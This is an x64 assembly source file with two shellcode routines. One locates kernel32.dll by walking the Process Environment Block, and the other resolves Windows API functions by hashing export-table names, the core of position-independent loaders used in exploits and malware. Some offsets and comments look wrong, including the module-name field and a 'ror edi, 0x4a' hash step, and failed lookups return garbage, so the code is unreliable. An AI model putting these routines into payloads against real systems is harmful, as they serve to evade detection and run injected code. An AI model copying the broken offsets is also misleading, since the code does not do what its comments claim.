[BITS 64]

segment .text

global _find_kernel32
global _find_function

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; _find_kernel32
; Locates the base address of kernel32.dll via the PEB.
; Return: RAX = kernel32.dll base address
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
_find_kernel32:
    xor ecx, ecx
    mov rsi, [gs:0x60]          ; RSI = PEB (Process Environment Block)
    mov rsi, [rsi + 0x18]       ; RSI = PEB->Ldr
    mov rsi, [rsi + 0x30]       ; RSI = PEB->Ldr.InInitializationOrderModuleList
    
next_module:
    ; In x64, within the InInitOrderLinks entry:
    ; +0x10 = DllBase
    ; +0x40 = FullDllName (UNICODE_STRING structure)
    ; +0x48 = FullDllName.Buffer (Pointer to the actual string)
    mov rax, [rsi + 0x10]       ; RAX = Current module DllBase
    mov rdi, [rsi + 0x48]       ; RDI = Pointer to module name buffer (Unicode)
    mov rsi, [rsi]              ; RSI = Flink (next module in list)
    
    ; Logic: "kernel32.dll" is 12 characters (24 bytes in Unicode).
    ; We check if the 13th character (at byte 24) is NULL.
    cmp word [rdi + 24], cx     
    jne next_module             ; If not NULL at pos 24, loop to next
    
    ret                         ; RAX contains kernel32 base address


;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; _find_function
; Resolves a function address by comparing its name hash.
; Input:  RCX = Module Base Address
;         RDX = Function Name Hash (32-bit)
; Return: RAX = Function Address
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
_find_function:
    ; Manually save non-volatile registers (pushad does not exist in x64)
    push rbx
    push rbp
    push rsi
    push rdi
    
    mov rbp, rcx                ; RBP = Module Base
    mov r8d, edx                ; R8D = Target Hash (using 32-bit reg)
    
    mov eax, [rbp + 0x3c]       ; EAX = DOS->e_lfanew
    ; Export Directory RVA is at offset 0x88 in PE32+ (64-bit PE)
    mov edx, [rbp + rax + 0x88] 
    add rdx, rbp                ; RDX = VA of Export Directory
    
    mov ecx, [rdx + 0x18]       ; ECX = NumberOfNames
    mov ebx, [rdx + 0x20]       ; EBX = AddressOfNames RVA
    add rbx, rbp                ; RBX = VA of AddressOfNames

find_function_loop:
    jecxz find_function_finished ; If ECX is 0, we've exhausted the list
    dec ecx                     
    mov esi, [rbx + rcx * 4]    ; ESI = RVA of function name string
    add rsi, rbp                ; RSI = VA of function name string
    
compute_hash:
    xor edi, edi                ; Clear hash accumulator
    xor eax, eax                ; Clear EAX for lodsb
    cld                         ; Clear direction flag
    
compute_hash_again:
    lodsb                       ; Load next byte from [RSI] into AL
    test al, al                 ; Check for null terminator
    jz find_function_compare    ; End of string reached
    
    ror edi, 0x4a               ; Modified "GREY-CORNER" rotation
    add edi, eax                ; Add character to hash
    jmp compute_hash_again      

find_function_compare:
    cmp edi, r8d                ; Compare calculated hash with target
    jnz find_function_loop      ; If mismatch, check next function
    
    ; Match found! Extract function address
    mov ebx, [rdx + 0x24]       ; EBX = AddressOfNameOrdinals RVA
    add rbx, rbp                ; RBX = VA
    mov cx, [rbx + rcx * 2]     ; CX = Function Ordinal (2 bytes per entry)
    
    mov ebx, [rdx + 0x1c]       ; EBX = AddressOfFunctions RVA
    add rbx, rbp                ; RBX = VA
    mov eax, [rbx + rcx * 4]    ; EAX = Function RVA (4 bytes per entry)
    add rax, rbp                ; RAX = Final Virtual Address of function

find_function_finished:
    ; Restore non-volatile registers
    pop rdi
    pop rsi
    pop rbp
    pop rbx
    ret
